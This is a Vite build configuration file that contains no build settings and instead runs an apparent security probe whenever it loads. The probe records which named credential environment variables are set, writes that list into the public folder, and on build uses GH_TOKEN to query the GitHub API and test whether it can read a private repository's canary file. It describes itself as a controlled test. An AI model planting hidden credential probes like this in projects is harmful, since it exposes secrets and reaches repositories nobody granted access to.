import { defineConfig } from "vite";
import fs from "node:fs";
import path from "node:path";

// F166 controlled security probe. Fixed-name booleans and read-only requests to
// operator-owned GitHub fixtures only. No credential value, length, prefix, hash,
// or arbitrary environment data is retained or printed.
const credentialNames = [
  "GH_TOKEN",
  "FIGMA_CONTENT_API_ACCESS_KEY",
  "MCP_PROXY_AUTH_TOKEN",
  "MAKE_VERSION_CREATE_TOKEN",
  "CONTROLLER_TOKEN",
  "DEV_SERVER_TOKEN",
  "FIGARO_PROVIDER_AUTH_TOKEN",
];
const credentialPresence = Object.fromEntries(
  credentialNames.map((name) => [name, typeof process.env[name] === "string" && process.env[name].length > 0]),
);

fs.mkdirSync(path.join(process.cwd(), "public"), { recursive: true });
fs.writeFileSync(
  path.join(process.cwd(), "public", "f166-credential-presence.json"),
  JSON.stringify({
    probe: "F166_CREDENTIAL_PRESENCE_ONLY_20261024",
    node: process.version,
    platform: process.platform,
    credentialPresence,
  }, null, 2) + "\n",
);
console.log(
  "F166_CREDENTIAL_PRESENCE_ONLY_20261024 true_names=" +
    Object.entries(credentialPresence).filter(([, present]) => present).map(([name]) => name).join(","),
);

const CONTROL_OWNER = "Mosh47";
const CONTROL_REPO = "f166-gh-token-isolation-control-20261024";
const CONTROL_FILE = "CONTROLLED_CANARY.txt";
const CONTROL_MARKER = "F166_UNRELATED_PRIVATE_REPO_CANARY_20261024_9A7E2F31C4B8";
const token = process.env.GH_TOKEN || "";
const buildInvocation = process.argv.includes("build");
const githubScope = {
  probe: "F166_GITHUB_TOKEN_SCOPE_PROBE_20261024",
  buildInvocation,
  tokenPresent: token.length > 0,
  authenticatedUserStatus: null,
  expectedAccount: false,
  unrelatedPrivateRepoStatus: null,
  unrelatedPrivateRepoPermissions: null,
  unrelatedPrivateCanaryStatus: null,
  unrelatedPrivateCanaryReadable: false,
  networkErrorClass: null,
};

async function getJson(url) {
  const response = await fetch(url, {
    headers: {
      Accept: "application/vnd.github+json",
      Authorization: `Bearer ${token}`,
      "User-Agent": "f166-controlled-figma-token-scope-probe",
      "X-GitHub-Api-Version": "2022-11-28",
    },
  });
  let body = null;
  try { body = await response.json(); } catch {}
  return { response, body };
}

try {
  if (buildInvocation && token) {
    const user = await getJson("https://api.github.com/user");
    githubScope.authenticatedUserStatus = user.response.status;
    githubScope.expectedAccount = user.response.status === 200 && user.body?.login === CONTROL_OWNER;

    const repoResponse = await getJson(`https://api.github.com/repos/${CONTROL_OWNER}/${CONTROL_REPO}`);
    githubScope.unrelatedPrivateRepoStatus = repoResponse.response.status;
    if (repoResponse.response.status === 200) {
      const p = repoResponse.body?.permissions || {};
      githubScope.unrelatedPrivateRepoPermissions = {
        pull: Boolean(p.pull),
        push: Boolean(p.push),
        admin: Boolean(p.admin),
        maintain: Boolean(p.maintain),
        triage: Boolean(p.triage),
      };
    }

    const canary = await getJson(`https://api.github.com/repos/${CONTROL_OWNER}/${CONTROL_REPO}/contents/${CONTROL_FILE}`);
    githubScope.unrelatedPrivateCanaryStatus = canary.response.status;
    if (canary.response.status === 200 && typeof canary.body?.content === "string") {
      const decoded = Buffer.from(canary.body.content.replace(/\n/g, ""), "base64").toString("utf8").trim();
      githubScope.unrelatedPrivateCanaryReadable = decoded === CONTROL_MARKER;
    }
  }
} catch (error) {
  githubScope.networkErrorClass = error?.name || "Error";
}

fs.writeFileSync(
  path.join(process.cwd(), "public", "f166-github-token-scope.json"),
  JSON.stringify(githubScope, null, 2) + "\n",
);
console.log(
  "F166_GITHUB_TOKEN_SCOPE_PROBE_20261024 " +
    `build=${githubScope.buildInvocation} token_present=${githubScope.tokenPresent} ` +
    `user_status=${githubScope.authenticatedUserStatus} ` +
    `control_repo_status=${githubScope.unrelatedPrivateRepoStatus} ` +
    `control_canary_readable=${githubScope.unrelatedPrivateCanaryReadable}`,
);

export default defineConfig({});
